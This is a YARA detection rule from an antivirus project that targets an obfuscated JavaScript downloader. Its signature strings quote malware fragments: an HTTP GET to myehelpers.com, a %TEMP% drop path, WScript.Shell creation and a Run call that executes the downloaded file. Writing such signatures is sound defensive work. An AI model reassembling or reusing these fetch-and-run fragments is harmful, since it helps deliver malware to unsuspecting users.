rule sig_20160427_fdf0577ffe676e6340203c13f009c48c {
  meta:
    description = "datamaliciousorder - file 20160427_fdf0577ffe676e6340203c13f009c48c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c3c85dad12c6932410e604f728b12e2a6cddcd441ea293f645e01b7e8c31f2ee"

  strings:
    $s1  = "QhigwPssbw[OuuwrLtndu](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function EpsppVtayq() {return TlyfbBsjdm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"D94mVkC" ascii
    $s3  = "function EpsppVtayq() {return TlyfbBsjdm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"D94mVkC" ascii
    $s4  = "function EfkvxOvind(QltccMjiqx, DtphhGfikj){MkixdFajzs = MkixdFajzs * 1; return QltccMjiqx - DtphhGfikj;};" fullword ascii
    $s5  = "var TlyfbBsjdm = function LcnlnTvqkr() {return NfxaeApvvs[XlojsEzrnb](\"WScript\"+\".Shell\");}(), JgylfPhtff = 11;" fullword ascii
    $s6  = "var NfxaeApvvs = this[\"WScript\"];" fullword ascii
    $s7  = "if (QhigwPssbw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function SwrptFsztd(){return QcelhWaogg + \"\";};" fullword ascii
    $s9  = "ShhweEojyg = true;" fullword ascii
    $s10 = "return EfkvxOvind(VeqlvZouur, EajboBsosm);" fullword ascii
    $s11 = "var JrqvwZkkec = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function MbhriPkycx(SsgfdLxshk){TlyfbBsjdm[\"R\"+\"un\"](SsgfdLxshk, MkixdFajzs, MkixdFajzs);};" fullword ascii
    $s13 = "YhnqkOfibr = true; " fullword ascii
    $s14 = "function OudimKyuoq(){return 23;};" fullword ascii
    $s15 = "function OnhotBslli(OlqphSxudq) {var PyrddIepqa = (1, 2, 3, 4, 5, OlqphSxudq); return PyrddIepqa;};" fullword ascii
    $s16 = "var YhnqkOfibr = false;" fullword ascii
    $s17 = "var ShhweEojyg = false;" fullword ascii
    $s18 = "}while (TwavzOqmvg);" fullword ascii
    $s19 = "function HdehqSlpvo()" fullword ascii
    $s20 = "function PpxmuThaot() {return ((YhnqkOfibr == true) && (YhnqkOfibr == AubggLcain)) ? 1 : MkixdFajzs;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}